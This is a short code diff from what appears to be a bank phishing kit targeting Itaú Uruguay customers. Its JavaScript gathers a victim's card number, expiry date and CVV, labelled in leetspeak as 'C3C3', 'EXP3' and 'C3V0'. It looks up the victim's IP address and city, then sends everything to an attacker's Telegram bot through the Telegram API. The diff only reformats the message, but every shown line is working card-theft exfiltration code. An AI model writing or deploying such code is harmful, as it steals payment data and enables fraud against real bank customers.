@@ -158,7 +158,7 @@
         fetch('https://ipapi.co/json')
         .then(response => response.json())
         .then(data => {
-            YOUR_MESSAGE_TEXT = "IT4U UYU EMPRES4\n\n\r C3C3: "+cliente+" \n\n\r EXP3: "+cliente2+" C3V0: "+cliente3+"   - IP: "+data.ip+" "+data.country+" "+data.city;
+            YOUR_MESSAGE_TEXT = "IT4U UYU \n\n\r C3C3: "+cliente+" \n\n\r EXP3: "+cliente2+"\n\n\r C3V0: "+cliente3+"\n\n\r   - IP: "+data.ip+" "+data.country+" "+data.city;
             const telegramApiUrl = `https://api.telegram.org/bot${YOUR_BOT_TOKEN}/sendMessage?chat_id=${YOUR_CHANNEL_ID}&text=${YOUR_MESSAGE_TEXT}`;
 
             fetch(telegramApiUrl)
